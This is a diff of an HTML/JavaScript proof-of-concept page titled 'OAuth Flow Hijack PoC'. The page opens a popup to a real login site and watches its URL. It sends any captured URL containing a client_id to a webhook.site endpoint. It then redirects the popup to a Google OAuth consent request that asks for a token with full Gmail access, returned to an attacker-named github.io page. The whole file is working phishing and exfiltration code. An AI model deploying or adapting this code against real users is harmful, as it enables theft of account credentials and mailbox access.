@@ -1,30 +1,41 @@
-<script>
-  const loginTarget = "https://auth.openai.com/log-in";
-  const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OAuth Flow Hijack PoC</title>
+</head>
+<body>
+  <h2>OAuth Flow Hijack PoC</h2>
+  <button id="startAttack">Start Attack</button>
 
-  function launch() {
-    const win = window.open(loginTarget, "_blank", "width=900,height=700");
+  <script>
+    document.getElementById("startAttack").addEventListener("click", function () {
+      const loginTarget = "https://auth.openai.com/log-in";
+      const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own if needed
 
-    const interval = setInterval(() => {
-      try {
-        const redirectedUrl = win.location.href;
+      const win = window.open(loginTarget, "_blank", "width=900,height=700");
 
-        if (redirectedUrl.includes("client_id")) {
-          clearInterval(interval);
+      const interval = setInterval(() => {
+        try {
+          const redirectedUrl = win.location.href;
 
-          // Send captured client_id URL to the webhook
-          fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "text/plain" },
-            body: `Captured URL: ${redirectedUrl}`
-          });
+          if (redirectedUrl.includes("client_id")) {
+            clearInterval(interval);
 
-          // Optional: Redirect the user to a fake OAuth flow
-          win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F");
+            // Send captured client_id URL to webhook
+            fetch(webhook, {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: `Captured URL: ${redirectedUrl}`
+            });
+
+            // Optional: redirect to a malicious OAuth flow
+            win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F");
+          }
+        } catch (err) {
+          // Cross-origin frame access error — expected until we hit same-origin
         }
-      } catch (err) {
-        // Cross-origin access will throw until window becomes same-origin or redirected to attacker-controlled domain
-      }
-    }, 1000);
-  }
-</script>
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
